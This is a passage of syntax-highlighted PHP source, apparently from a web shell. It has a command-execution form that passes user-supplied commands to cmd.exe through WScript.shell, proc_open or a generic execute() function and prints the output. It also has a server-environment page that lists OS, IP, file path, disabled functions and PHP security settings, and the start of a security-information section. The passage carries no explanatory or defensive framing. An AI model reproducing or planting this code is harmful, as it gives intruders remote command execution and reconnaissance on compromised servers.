<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeselect(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Use:'</span>,<span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'execfunc'</span>,<span style="color: #99ffff;">'option'</span>=&gt;$<span style="color: #ffeead;">execfuncd</span><span style="color: #ffeead; text-decoration: underline;">b</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffeead; text-decoration: underline;">execfunc</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Command'</span>,<span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'command'</span>,<span style="color: #99ffff;">'value'</span>=&gt;<span style="color: #ffffff; background-color: #002451;">htmlspecialcha</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">rs(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">command</span><span style="text-decoration: underline;">)));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'submit'</span>,<span style="color: #99ffff;">'class'</span>=&gt;<span style="color: #99ffff;">'bt'</span>,<span style="color: #99ffff;">'type'</span>=&gt;<span style="color: #99ffff;">'submit'</span>,<span style="color: #99ffff;">'value'</span>=&gt;<span style="color: #99ffff;">'Ex</span><span style="color: #99ffff; text-decoration: underline;">ecute'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/p&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">command</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;hr width="100%" noshade /&gt;&lt;pre&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">execfunc</span>==<span style="color: #99ffff;">'wscript'</span> &amp;&amp; <span style="color: #ff9da4; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #ff9da4; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">wsh</span> = <span style="color: #d1f1a9;">new</span> <span style="color: #bbdaff;">COM</span>(<span style="color: #99ffff;">'WScript.shell'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">exec</span> = $<span style="color: #ffeead;">wsh</span>-&gt;<span style="color: #ffffff; background-color: #002451;">exec</span>(<span style="color: #99ffff;">'cmd.exe /c '</span>.$<span style="color: #ffeead;">command</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">stdout</span> = $<span style="color: #ffeead;">exec</span>-&gt;<span style="color: #ffffff; background-color: #002451;">StdOut</span>();
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">stroutput</span> = $<span style="color: #ffeead;">stdout</span>-&gt;<span style="color: #ffffff; background-color: #002451;">ReadAll</span>();
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> $<span style="color: #ffeead;">stroutput</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">execfunc</span>==<span style="color: #99ffff;">'proc_open'</span> &amp;&amp; <span style="color: #ff9da4; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #ff9da4; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">descriptorspec</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>  <span style="color: #ffffff; background-color: #002451;">0</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'pipe'</span>, <span style="color: #99ffff;">'r'</span>),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>  <span style="color: #ffffff; background-color: #002451;">1</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'pipe'</span>, <span style="color: #99ffff;">'w'</span>),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>  <span style="color: #ffffff; background-color: #002451;">2</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'pipe'</span>, <span style="color: #99ffff;">'w'</span>)
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   );
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">process</span> = <span style="color: #ffffff; background-color: #002451;">proc_open(</span>$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'COMSPEC'</span>], $<span style="color: #ffeead;">descriptorspec</span>, $<span style="color: #ffeead;">pipes</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">is_resource(</span>$<span style="color: #ffeead;">process</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">fwrite(</span>$<span style="color: #ffeead;">pipes</span>[<span style="color: #ffffff; background-color: #002451;">0</span>], $<span style="color: #ffeead;">command</span>.<span style="color: #99ffff;">"\r\n"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">fwrite(</span>$<span style="color: #ffeead;">pipes</span>[<span style="color: #ffffff; background-color: #002451;">0</span>], <span style="color: #99ffff;">"exit\r\n"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">pipes</span>[<span style="color: #ffffff; background-color: #002451;">0</span>]);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span> (!<span style="color: #ffffff; background-color: #002451;">feof(</span>$<span style="color: #ffeead;">pipes</span>[<span style="color: #ffffff; background-color: #002451;">1</span>])) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> <span style="color: #ffffff; background-color: #002451;">fgets(</span>$<span style="color: #ffeead;">pipes</span>[<span style="color: #ffffff; background-color: #002451;">1</span>], <span style="color: #ffffff; background-color: #002451;">1024</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">pipes</span>[<span style="color: #ffffff; background-color: #002451;">1</span>]);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span> (!<span style="color: #ffffff; background-color: #002451;">feof(</span>$<span style="color: #ffeead;">pipes</span>[<span style="color: #ffffff; background-color: #002451;">2</span>])) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> <span style="color: #ffffff; background-color: #002451;">fgets(</span>$<span style="color: #ffeead;">pipes</span>[<span style="color: #ffffff; background-color: #002451;">2</span>], <span style="color: #ffffff; background-color: #002451;">1024</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">pipes</span>[<span style="color: #ffffff; background-color: #002451;">2</span>]);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">proc_close(</span>$<span style="color: #ffeead;">process</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span>(<span style="color: #ffffff; background-color: #002451;">execute(</span>$<span style="color: #ffeead;">command</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/pre&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   }
}<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">end shell</span>

<span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'phpenv'</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">upsize</span>=<span style="color: #ffffff; background-color: #002451;">getcfg(</span><span style="color: #99ffff;">'file_uploads'</span>) ? <span style="color: #ffffff; background-color: #002451;">getcfg(</span><span style="color: #99ffff;">'upload_max_filesize'</span>) : <span style="color: #99ffff;">'Not allowe</span><span style="color: #99ffff; text-decoration: underline;">d'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">adminmail</span>=<span style="color: #ffffff; background-color: #002451;">isset(</span>$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'SERVER_ADMIN'</span>]) ? $<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'SERVER_ADMIN'</span>] : <span style="color: #ffffff; background-color: #002451;">getc</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">fg(</span><span style="color: #99ffff; text-decoration: underline;">'sendmail_from'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">dis_func</span> &amp;&amp; $<span style="color: #ffeead;">dis_func</span> = <span style="color: #99ffff;">'No'</span>;<span style="color: #ff9da4; background-color: #003f8e;">     </span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">info</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">1</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'Server Time'</span>,<span style="color: #ffffff; background-color: #002451;">date(</span><span style="color: #99ffff;">'Y/m/d h:i:s'</span>,$<span style="color: #ffeead;">timestamp</span>)),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">2</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'Server Domain'</span>,$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'SERVER_NAME'</span>]),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">3</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'Server IP'</span>,<span style="color: #ffffff; background-color: #002451;">gethostbyname(</span>$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'SERVER_NAME'</span>])),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">4</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'Server OS'</span>,<span style="color: #bbdaff;">PHP_OS</span>),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">5</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'Server OS Charset'</span>,$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'HTTP_ACCEPT_LANGUAGE'</span>]),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">6</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'Server Software'</span>,$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'SERVER_SOFTWARE'</span>]),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">7</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'Server Web Port'</span>,$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">'SERVER_PORT'</span>]),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">8</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'PHP run mode'</span>,<span style="color: #ffffff; background-color: #002451;">strtoupper(php_sapi_name(</span>))),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">9</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'The file path'</span>,<span style="color: #bbdaff;">__FILE__</span>),

<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">10</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'PHP Version'</span>,<span style="color: #bbdaff;">PHP_VERSION</span>),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">11</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'PHPINFO'</span>,(<span style="color: #ff9da4; font-weight: bold;">IS_PHPINFO</span> ? <span style="color: #99ffff;">'&lt;a href="javascript:g(\'phpinfo\');</span><span style="color: #99ffff; text-decoration: underline;">"&gt;Yes&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">'No'</span><span style="text-decoration: underline;">)),</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">12</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'Safe Mode'</span>,<span style="color: #ffffff; background-color: #002451;">getcfg(</span><span style="color: #99ffff;">'safe_mode'</span>)),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">13</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'Administrator'</span>,$<span style="color: #ffeead;">adminmail</span>),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">14</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'allow_url_fopen'</span>,<span style="color: #ffffff; background-color: #002451;">getcfg(</span><span style="color: #99ffff;">'allow_url_fopen'</span>)),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">15</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'enable_dl'</span>,<span style="color: #ffffff; background-color: #002451;">getcfg(</span><span style="color: #99ffff;">'enable_dl'</span>)),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">16</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'display_errors'</span>,<span style="color: #ffffff; background-color: #002451;">getcfg(</span><span style="color: #99ffff;">'display_errors'</span>)),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">17</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'register_globals'</span>,<span style="color: #ffffff; background-color: #002451;">getcfg(</span><span style="color: #99ffff;">'register_globals'</span>)),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">18</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'magic_quotes_gpc'</span>,<span style="color: #ffffff; background-color: #002451;">getcfg(</span><span style="color: #99ffff;">'magic_quotes_gpc'</span>)),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">19</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'memory_limit'</span>,<span style="color: #ffffff; background-color: #002451;">getcfg(</span><span style="color: #99ffff;">'memory_limit'</span>)),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">20</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'post_max_size'</span>,<span style="color: #ffffff; background-color: #002451;">getcfg(</span><span style="color: #99ffff;">'post_max_size'</span>)),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">21</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'upload_max_filesize'</span>,$<span style="color: #ffeead;">upsize</span>),
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">22</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'max_execution_time'</span>,<span style="color: #ffffff; background-color: #002451;">getcfg(</span><span style="color: #99ffff;">'max_execution_time'</span>).<span style="color: #99ffff;">' second(s</span><span style="color: #99ffff; text-decoration: underline;">)'</span><span style="text-decoration: underline;">),</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">23</span> =&gt; <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">'disable_functions'</span>,$<span style="color: #ffeead;">dis_func</span>),
<span style="background-color: #003f8e;"> </span>   );

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">phpvarname</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span>$<span style="color: #ffeead;">phpvarname</span> .<span style="color: #99ffff;">' : '</span>.<span style="color: #ffffff; background-color: #002451;">getcfg(</span>$<span style="color: #ffeead;">phpvarname</span>));
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Server environment'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'phpenv'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makeinput(array(</span><span style="color: #99ffff;">'title'</span>=&gt;<span style="color: #99ffff;">'Please input PHP configuration parameter(eg:magic_</span><span style="color: #99ffff; text-decoration: underline;">quotes_gpc)'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #99ffff; text-decoration: underline;">'phpvarname'</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffeead; text-decoration: underline;">phpvarname</span><span style="text-decoration: underline;">,</span><span style="color: #99ffff; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfooter(</span>);

<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">hp</span> = <span style="color: #ffffff; background-color: #002451;">array(0</span>=&gt; <span style="color: #99ffff;">'Server'</span>, <span style="color: #ffffff; background-color: #002451;">1</span>=&gt; <span style="color: #99ffff;">'PHP'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">for</span>($<span style="color: #ffeead;">a</span>=<span style="color: #ffffff; background-color: #002451;">0</span>;$<span style="color: #ffeead;">a</span>&lt;<span style="color: #ffffff; background-color: #002451;">2</span>;$<span style="color: #ffeead;">a</span>++) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;'</span>.$<span style="color: #ffeead;">hp</span>[$<span style="color: #ffeead;">a</span>].<span style="color: #99ffff;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">a</span>==<span style="color: #ffffff; background-color: #002451;">0</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">for</span>($<span style="color: #ffeead;">i</span>=<span style="color: #ffffff; background-color: #002451;">1</span>;$<span style="color: #ffeead;">i</span>&lt;=<span style="color: #ffffff; background-color: #002451;">9</span>;$<span style="color: #ffeead;">i</span>++) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #ffeead;">info</span>[$<span style="color: #ffeead;">i</span>][<span style="color: #ffffff; background-color: #002451;">0</span>].<span style="color: #99ffff;">':&lt;/u&gt;'</span>.$<span style="color: #ffeead;">info</span>[$<span style="color: #ffeead;">i</span>][<span style="color: #ffffff; background-color: #002451;">1</span>].<span style="color: #99ffff;">'&lt;/li&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">a</span> == <span style="color: #ffffff; background-color: #002451;">1</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">for</span>($<span style="color: #ffeead;">i</span>=<span style="color: #ffffff; background-color: #002451;">10</span>;$<span style="color: #ffeead;">i</span>&lt;=<span style="color: #ffffff; background-color: #002451;">23</span>;$<span style="color: #ffeead;">i</span>++) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #ffeead;">info</span>[$<span style="color: #ffeead;">i</span>][<span style="color: #ffffff; background-color: #002451;">0</span>].<span style="color: #99ffff;">':&lt;/u&gt;'</span>.$<span style="color: #ffeead;">info</span>[$<span style="color: #ffeead;">i</span>][<span style="color: #ffffff; background-color: #002451;">1</span>].<span style="color: #99ffff;">'&lt;/li&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/ul&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   }
}<span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">end phpenv</span>

<span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'secinfo'</span>) {

<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Server software'</span>, @<span style="color: #ffffff; background-color: #002451;">getenv(</span><span style="color: #99ffff;">'SERVER_SOFTWARE'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Disabled PHP Functions'</span>, ($<span style="color: #bbdaff;">GLOBALS</span>[<span style="color: #99ffff;">'disable_functions'</span>])?$<span style="color: #bbdaff;">GLOBALS</span>[<span style="color: #99ffff; text-decoration: underline;">'disable_functions'</span><span style="text-decoration: underline;">]:</span><span style="color: #99ffff; text-decoration: underline;">'none'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Open base dir'</span>, @<span style="color: #ffffff; background-color: #002451;">ini_get(</span><span style="color: #99ffff;">'open_basedir'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Safe mode exec dir'</span>, @<span style="color: #ffffff; background-color: #002451;">ini_get(</span><span style="color: #99ffff;">'safe_mode_exec_dir'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'Safe mode include dir'</span>, @<span style="color: #ffffff; background-color: #002451;">ini_get(</span><span style="color: #99ffff;">'safe_mode_include_dir'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">secparam(</span><span style="color: #99ffff;">'cURL support'</span>, <span style="color: #ffffff; background-color: #002451;">function_exists(</span><span style="color: #99ffff;">'curl_version'</span>)?<span style="color: #99ffff;">'enabled'</span>:<span style="color: #99ffff;">'no'</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">temp</span>=<span style="color: #ffffff; background-color: #002451;">array(</span>);
